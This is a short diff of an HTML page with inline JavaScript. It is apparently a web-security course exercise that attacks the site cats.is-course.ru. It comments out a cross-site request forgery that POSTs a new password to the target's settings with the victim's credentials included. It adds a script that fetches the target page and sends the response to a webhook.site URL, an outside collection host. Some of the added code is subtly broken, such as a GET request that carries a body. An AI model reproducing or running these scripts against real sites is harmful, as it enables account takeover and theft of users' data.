@@ -7,7 +7,7 @@
 <p>My first paragraph 2.</p>
 <script>
   
-fetch('https://cats.is-course.ru/settings', {
+/*fetch('https://cats.is-course.ru/settings', {
   method: 'POST',
   mode: 'no-cors',
   credentials: 'include',
@@ -15,7 +15,20 @@ fetch('https://cats.is-course.ru/settings', {
   body: 'password=LupaLupaLupa1236%23&confirm-password=LupaLupaLupa1236%23'
 })
   .then(response => response.text())
-  .then(responseText => console.log(responseText));
+  .then(responseText => console.log(responseText));*/
+
+fetch('https://cats.is-course.ru/', {
+  method: 'GET',
+  mode: 'no-cors',
+  headers: {'Access-Control-Allow-Origin': '*'}
+})
+  .then(response => response.text())
+  .then(responseText => fetch('https://webhook.site/cc069b0d-de1e-44e7-a003-4446b873069d', {
+  method: 'GET',
+  mode: 'no-cors',
+  headers: {'Access-Control-Allow-Origin': '*'},
+  body: responseText
+}).then(response => response.text()).then(responseText => console.log(responseText));
 
 </script>
   
